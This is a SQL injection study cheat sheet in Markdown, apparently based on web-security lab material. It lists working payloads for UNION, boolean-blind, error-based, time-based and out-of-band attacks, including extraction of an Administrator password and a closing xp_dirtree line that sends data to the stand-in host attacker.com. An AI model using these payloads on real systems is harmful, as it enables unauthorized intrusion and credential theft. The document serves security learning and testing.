# SQL injection

## SQL Injection Cheatsheet

* https://tib3rius.com/sqli

## Overview

**How to detect SQL injection vulnerabilities**

* The single quote character `'` and look for errors or other anomalies.
* Boolean conditions such as `OR 1=1` and `OR 1=2`, and look for differences in the responses.
* Trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.
* OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.

**SQL injection in different parts of the query**

* Most SQL injection vulnerabilities occur within the `WHERE` clause of a `SELECT` query.
* However, SQL injection vulnerabilities can occur at any location (UPDATE, INSERT, SELECT \[column, table], ORDER BY)

**Warning: OR 1=1**

* If your condition reaches an UPDATE or DELETE statement, for example, it can result in an accidental loss of data.

**Database-specific syntax**

* Example:
  * Oracle: every `SELECT` query must use the `FROM` keyword and specify a valid table
  * MySQL: the double-dash sequence must be followed by a space

## SQL injection UNION attacks

* Requirements
  * How many columns are being returned from the original query
  * Which columns returned from the original query are of a suitable data type to hold the results from the injected query

### Determining the number of columns required

* First way: Injecting a series of `ORDER BY` clauses and incrementing the specified column index until an error occurs. Example (the injection point is a quoted string within the `WHERE` clause)
  * ```
    ' ORDER BY 1--
    ' ORDER BY 2--
    ' ORDER BY 3--
    etc.
    ```
* Second way: submitting a series of `UNION SELECT` payloads specifying a different number of null values. NULL is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct.
  * ```
    ' UNION SELECT NULL--
    ' UNION SELECT NULL,NULL--
    ' UNION SELECT NULL,NULL,NULL--
    etc.
    ```
* Note: the application might actually return the database error in its HTTP response, but may return a generic error or simply return no results

### Finding columns with a useful data type

* Do you want a string?
  * ```
    ' UNION SELECT 'a',NULL,NULL,NULL--
    ' UNION SELECT NULL,'a',NULL,NULL--
    ' UNION SELECT NULL,NULL,'a',NULL--
    ' UNION SELECT NULL,NULL,NULL,'a'--
    ```
  * If no error occurs and the response includes the injected string, the column is suitable for retrieving string data.

### Examining the database

* `' UNION SELECT @@version--`
* Most database types (except Oracle) have a set of views called the information schema

```markdown
# MySQL
# information_schema.tables
TABLE_CATALOG    TABLE_SCHEMA    TABLE_NAME    TABLE_TYPE
MyDatabase       dbo             Products      BASE TABLE

# information_schema.columns
TABLE_CATALOG    TABLE_SCHEMA    TABLE_NAME    COLUMN_NAME    DATA_TYPE
MyDatabase       dbo             Users          UserId        id

# Find tables names
SELECT * FROM information_schema.tables
# Find columns names
SELECT * FROM information_schema.columns WHERE table_name = 'Users'SELECT * FROM information_schema.tables


# Oracle
SELECT * FROM all_tables
SELECT TABLE_NAME FROM all_tables
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
SELECT COLUMN_NAME FROM all_tab_columns WHERE table_name = 'USERS'
```

### Retrieving multiple values within a single column

* You can retrieve multiple values together within this single column by concatenating the values together
* `' UNION SELECT username || '~' || password FROM users--`

## Blind SQL Injection

* Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.

### Triggering conditional responses

* `SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`
  * …xyz' AND '1'='1
    * The query return results, because the injected `AND '1'='1` condition is true. As a result, the "Welcome back" message is displayed.
  * …xyz' AND '1'='2
    * The query do not return any results, because the injected condition is false. The "Welcome back" message is not displayed.
* Extract data one piece at a time
  * `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`
    * This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than `m`
  * `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't`
    * This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than `t`.
  * `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's`
    * ... Confirm that the first character of the password is `s`
  * We can continue this process to systematically determine the full password for the Administrator user.

### Error-based SQL injection

* Problem: Some applications carry out SQL queries but their behavior doesn't change, regardless of whether the query returns any data. The technique "Triggering conditional responses" won't work, because injecting different boolean conditions makes no difference to the application's responses.
* It's often possible to induce the application to return a different response depending on whether a SQL error occurs and extract or infer sensitive data from the database, even in blind contexts.
* `xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a`
  * The CASE expression evaluates to 'a', which does not cause any error.
* `xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`
  * It evaluates to 1/0, which causes a divide-by-zero error.
* You can use this to determine whether the injected condition is true.
* `xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
* Note: There are different ways of triggering conditional errors, and different techniques work best on different database types. See SQL cheat sheet

<details>

<summary>Example</summary>

<pre class="language-markdown"><code class="lang-markdown"># In this example the response are always the same. 
<strong># However, if you submit an invalid query you will get an error.
</strong><strong>
</strong><strong># 1 - Check if it's vulnerable
</strong>## Normal request. 200 OK
Cookie: TrackingId=xyz
## Cause error. 500 Internal Server Error
Cookie: TrackingId=xyz'


# 2 - Identify database [tiberius cheatsheet]. NOTE: add comment...
## (MySql). 500 Internal Server Error
Cookie: TrackingId=xyz' AND 'foo' 'bar' = 'foobar'#
## (ORACLE). 200 OK
Cookie: TrackingId=a' AND LENGTHB('foo') = '3'--


# 3 - Test boolean error. 
## Error condition: 500 OK
Cookie: TrackingId=xyz'	AND 1=(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '1' END FROM dual)--
## No error condition: 200 OK
Cookie: TrackingId=xyz'	AND 1=(SELECT CASE WHEN (2=1) THEN TO_CHAR(1/0) ELSE '1' END FROM dual)--


# 4 - Extract data
## Error condition: 500 OK (it means that first char is 'a')
Cookie: TrackingId=xyz'	AND 1=(SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'a') THEN TO_CHAR(1/0) ELSE '1' END FROM dual)--
## No error condition: 200 OK
Cookie: TrackingId=xyz'	AND 1=(SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'b') THEN TO_CHAR(1/0) ELSE '1' END FROM dual)--
</code></pre>

</details>

**Extracting sensitive data via verbose SQL error messages**

* Example: inject `'` and you get an error: `Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char`
* You can use the `CAST()` function to turns an otherwise blind SQL injection vulnerability into a visible one
* `TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`

### Time-based SQL injection

* Condition: As SQL queries are normally processed synchronously by the application, delaying the execution of a SQL query also delays the HTTP response.
* Triggering time delays depending on whether an injected condition is true or false

```
'; IF (1=2) WAITFOR DELAY '0:0:10'--    
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

* The first does not trigger a delay (false), the second does (true)
* We can retrieve data by testing one character at a time
* `'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`\


### Out-Of-Band (OAST) SQL injection

An application might carry out a SQL query asynchronously (another thread execute the SQL query)

```markdown
# Triggering a DNS query
'; exec master..xp_dirtree '//attacker.com/a'--

# Exfiltrate data
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.attacker.com/a"')--
```
